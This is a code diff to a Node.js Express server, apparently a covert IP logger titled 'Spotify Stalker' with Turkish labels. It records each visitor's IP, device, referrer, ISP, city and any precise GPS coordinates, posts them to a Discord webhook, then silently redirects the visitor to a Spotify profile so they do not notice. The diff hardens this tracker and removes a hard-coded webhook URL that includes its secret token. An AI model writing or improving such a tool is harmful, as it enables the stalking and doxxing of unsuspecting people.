@@ -1,18 +1,33 @@
+require('dotenv').config();
 const express = require('express');
+const helmet = require('helmet');
+const rateLimit = require('express-rate-limit');
 const https = require('https');
+const http = require('http');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const WEBHOOK = 'https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO';
-const REDIRECT = 'https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22be720da7b1485a';
+const WEBHOOK = process.env.WEBHOOK;
+const REDIRECT = process.env.REDIRECT || 'https://open.spotify.com';
+
+if (!WEBHOOK) {
+  console.error('WEBHOOK environment variable is required');
+  process.exit(1);
+}
+
+app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
+app.use(rateLimit({ windowMs: 60 * 1000, max: 30, message: 'Too many requests' }));
 
 function fetchJSON(url) {
   return new Promise((resolve, reject) => {
-    const mod = url.startsWith('https') ? require('https') : require('http');
+    const mod = url.startsWith('https') ? https : http;
     mod.get(url, res => {
       let data = '';
       res.on('data', c => data += c);
-      res.on('end', () => { try { resolve(JSON.parse(data)); } catch(e) { reject(e); } });
+      res.on('end', () => {
+        try { resolve(JSON.parse(data)); }
+        catch (e) { reject(new Error('Invalid JSON: ' + e.message)); }
+      });
     }).on('error', reject);
   });
 }
@@ -21,8 +36,23 @@ function postJSON(url, payload) {
   return new Promise((resolve, reject) => {
     const data = JSON.stringify(payload);
     const u = new URL(url);
-    const opts = { hostname: u.hostname, path: u.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } };
-    const req = https.request(opts, () => resolve());
+    const opts = {
+      hostname: u.hostname,
+      path: u.pathname + u.search,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(data)
+      }
+    };
+    const req = https.request(opts, res => {
+      let body = '';
+      res.on('data', c => body += c);
+      res.on('end', () => {
+        if (res.statusCode >= 200 && res.statusCode < 300) resolve(body);
+        else reject(new Error('HTTP ' + res.statusCode + ': ' + body));
+      });
+    });
     req.on('error', reject);
     req.write(data);
     req.end();
@@ -126,25 +156,36 @@ function relDate(d) {
   return fmtDate(d);
 }
 
+function escapeHtml(str) {
+  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
+}
+
+function sanitize(s) {
+  return typeof s === 'string' ? s.replace(/[<>"'&]/g, '') : '';
+}
+
+app.use(express.static(__dirname));
+
 app.get('/', async (req, res) => {
   try {
     const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
     const uaStr = req.headers['user-agent'] || '';
     const referrer = req.headers['referer'] || '';
     let { os, browser, device, app: detectedApp } = parseUA(uaStr);
-    if (req.query.device) device = req.query.device;
-    console.log('UA:', uaStr, '→ Device:', device, 'OS:', os, 'Browser:', browser);
+    if (req.query.device) device = sanitize(req.query.device);
     const source = detectedApp !== 'Doğrudan / Bilinmiyor' ? detectedApp : (referrer || 'Doğrudan / Bilinmiyor');
     let geo = {};
-    try { geo = await fetchJSON('http://ip-api.com/json/'+ip+'?fields=city,country,countryCode,isp,org,lat,lon'); } catch(e) {}
+    try { geo = await fetchJSON('http://ip-api.com/json/'+ip+'?fields=city,country,countryCode,isp,org,lat,lon'); } catch(e) { console.error('Geo error:', e.message); }
     const flag = codeToFlag(geo.countryCode);
     const eksKonum = geo.city ? geo.city+', '+geo.country : 'Bilinmiyor';
     let mapsLink = '';
     let konum = flag+' '+eksKonum;
     let geoDurum = '';
     if (req.query.geo === 'izin_verdi') {
-      mapsLink = 'https://www.google.com/maps?q='+req.query.lat+','+req.query.lon;
-      let acc = req.query.acc ? ' (±'+req.query.acc+'m)' : '';
+      const lat = sanitize(req.query.lat || '');
+      const lon = sanitize(req.query.lon || '');
+      if (lat && lon) mapsLink = 'https://www.google.com/maps?q='+lat+','+lon;
+      let acc = req.query.acc ? ' (±'+sanitize(req.query.acc)+'m)' : '';
       konum = flag+' '+eksKonum+'\n:crosshairs: Kesin konum:\n[Haritada göster]('+mapsLink+')'+acc;
       geoDurum = 'Konuma izin verdi :white_check_mark:';
     } else if (req.query.geo === 'izin_vermedi') {
@@ -152,7 +193,7 @@ app.get('/', async (req, res) => {
     } else if (geo.lat) {
       mapsLink = 'https://www.google.com/maps?q='+geo.lat+','+geo.lon;
       konum = flag+' '+eksKonum+'\n[Haritada göster]('+mapsLink+')';
-      geoDurum = 'IP bazl\u0131 konum';
+      geoDurum = 'IP bazlı konum';
     }
     if (geoDurum) konum += '\n_'+geoDurum+'_';
     const now = new Date();
@@ -166,10 +207,11 @@ app.get('/', async (req, res) => {
       { name: ':link: Yönlendiren', value: source, inline: true },
       { name: ':alarm_clock: Tarih', value: fmtDate(now), inline: true }
     ];
-    await postJSON(WEBHOOK, { embeds: [{ title: 'Spotify Stalkeri !!!', color: 0x1DB954, fields, footer: { text: 'Spotify Stalker \u00b7 37xw \u2022 '+relDate(now) } }] });
-  } catch(e) {}
-  const r = REDIRECT.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
-  res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="refresh" content="0;url='+r+'"><script>location.replace('+JSON.stringify(REDIRECT)+')</script></head><body></body></html>');
+    await postJSON(WEBHOOK, { embeds: [{ title: 'Spotify Stalkeri !!!', color: 0x1DB954, fields, footer: { text: 'Spotify Stalker · 37xw • '+relDate(now) } }] });
+  } catch(e) { console.error('Webhook error:', e.message); }
+
+  const safeRedirect = escapeHtml(REDIRECT);
+  res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="refresh" content="0;url='+safeRedirect+'"><script>location.replace('+JSON.stringify(REDIRECT)+')</script></head><body></body></html>');
 });
 
 app.listen(PORT, () => console.log('Server running on port '+PORT));
